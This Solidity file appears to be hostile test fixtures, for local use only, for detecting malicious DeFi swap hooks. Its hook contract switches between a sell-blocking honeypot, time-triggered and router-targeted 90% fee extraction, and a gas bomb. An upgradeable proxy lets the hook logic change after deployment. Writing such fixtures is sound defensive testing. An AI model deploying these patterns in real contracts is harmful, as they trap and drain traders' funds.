// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;
// HOSTILE TEST FIXTURES ONLY. Unrestricted configuration/deployment, local anvil only.
struct PoolKey { address currency0; address currency1; uint24 fee; int24 tickSpacing; address hooks; }
struct SwapParams { bool zeroForOne; int256 amountSpecified; uint160 sqrtPriceLimitX96; }
struct ModifyLiquidityParams { int24 tickLower; int24 tickUpper; int256 liquidityDelta; bytes32 salt; }
interface C3RManager {
    function initialize(PoolKey calldata key, uint160 sqrtPriceX96) external returns (int24);
    function unlock(bytes calldata data) external returns (bytes memory);
    function modifyLiquidity(PoolKey calldata key, ModifyLiquidityParams calldata params, bytes calldata hookData) external returns (int256,int256);
    function sync(address token) external;
    function settle() external payable returns (uint256);
    function take(address token, address recipient, uint256 amount) external;
}
interface C3RToken { function transfer(address,uint256) external returns(bool); }
contract C3RHostileHook {
    address public manager;
    address public router;
    bool public buyDirection;
    uint8 public mode;
    uint64 public lastSafeTimestamp;
    // 0 control, 1 sell honeypot, 2 block-aware extraction, 3 UR-only fee jump, 4 gas bomb.
    function configure(address m,address r,bool direction,uint8 behavior,uint64 safeTimestamp) external {
        require(behavior <= 4); manager=m; router=r; buyDirection=direction; mode=behavior; lastSafeTimestamp=safeTimestamp;
    }
    function beforeSwap(address sender,PoolKey calldata,SwapParams calldata params,bytes calldata data)
        external returns(bytes4,int256,uint24) {
        require(msg.sender==manager && data.length==0);
        if(mode==1 && params.zeroForOne!=buyDirection) revert("C3R_HONEYPOT");
        if(mode==4) { assembly { for { } 1 { } { mstore(0, keccak256(0,32)) } } }
        uint24 fee = ((mode==2 && block.timestamp>lastSafeTimestamp) || (mode==3 && sender==router)) ? 900000 : 3000;
        return(this.beforeSwap.selector,0,fee | 0x400000);
    }
    function version() external pure virtual returns(uint256){return 1;}
}
contract C3RChangedHook is C3RHostileHook {
    function version() external pure override returns(uint256){return 2;}
}
contract C3RProxyHook {
    bytes32 private constant SLOT=0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    constructor(address target){assembly{sstore(SLOT,target)}}
    function upgrade(address target) external {assembly{sstore(SLOT,target)}}
    fallback() external payable {assembly {
        let target:=sload(SLOT)
        calldatacopy(0,0,calldatasize())
        let success:=delegatecall(gas(),target,0,calldatasize(),0,0)
        returndatacopy(0,0,returndatasize())
        switch success case 0 {revert(0,returndatasize())} default {return(0,returndatasize())}
    }}
}
contract C3RFactory {
    event Deployed(address indexed deployed,bytes32 salt);
    function deploy(bytes32 salt,bytes calldata code) external returns(address deployed){
        bytes memory init=code;assembly {deployed:=create2(0,add(init,32),mload(init),salt)}
        require(deployed!=address(0));emit Deployed(deployed,salt);
    }
}
contract C3RSeeder {
    address private manager;
    function seed(address target,PoolKey calldata key,uint128 liquidity) external {
        require(manager==address(0) && liquidity>0 && key.currency0!=address(0));manager=target;
        C3RManager(target).initialize(key,uint160(1<<96));
        C3RManager(target).unlock(abi.encode(key,liquidity));manager=address(0);
    }
    function unlockCallback(bytes calldata data) external returns(bytes memory){
        require(msg.sender==manager && manager!=address(0));
        (PoolKey memory key,uint128 liquidity)=abi.decode(data,(PoolKey,uint128));
        (int256 delta,)=C3RManager(manager).modifyLiquidity(key,ModifyLiquidityParams(-887220,887220,int256(uint256(liquidity)),bytes32(0)),"");
        settle(key.currency0,int128(delta>>128)); settle(key.currency1,int128(delta)); return "";
    }
    function settle(address token,int128 delta) private {
        if(delta<0){C3RManager(manager).sync(token);require(C3RToken(token).transfer(manager,uint256(-int256(delta))));C3RManager(manager).settle();}
        else if(delta>0)C3RManager(manager).take(token,address(this),uint256(int256(delta)));
    }
}
